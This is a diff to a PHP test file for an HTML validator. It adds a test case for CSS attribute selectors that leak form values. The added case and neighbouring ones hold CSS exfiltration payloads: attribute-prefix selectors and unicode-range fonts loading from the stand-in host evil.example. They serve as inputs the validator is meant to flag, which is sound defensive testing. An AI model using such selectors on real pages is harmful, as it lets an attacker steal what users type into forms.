@@ -187,6 +187,7 @@ final class CssTest extends HtmlValidatorTestCase
             'spaces around'          => ['input[ value ^= "a" ] { color: red }', '[ value ^='],
             'comment inside'         => ['input[value/**/^="a"] { color: red }', '[value ^='],   // comments are blanked before the check, so the quote shows a space in its place
             'uppercase'              => ['INPUT[VALUE^="a"] { color: red }', '[VALUE^='],
+            'namespace wildcard'     => ['input[*|value^="a"] { background: url(//evil.example/?a) }', '[*|value^='],   // *| means any namespace, including none, so browsers read it as [value^=
             'no url at all'          => ['input[value^="a"] { color: red }', '[value^='],   // the rule is the selector, whatever follows it
             'unicode-range'          => ['@font-face { font-family: f; src: url(https://evil.example/f); unicode-range: U+65 }', 'unicode-range'],
             'unicode-range spaced'   => ['@font-face { unicode-range : U+65 }', 'unicode-range'],
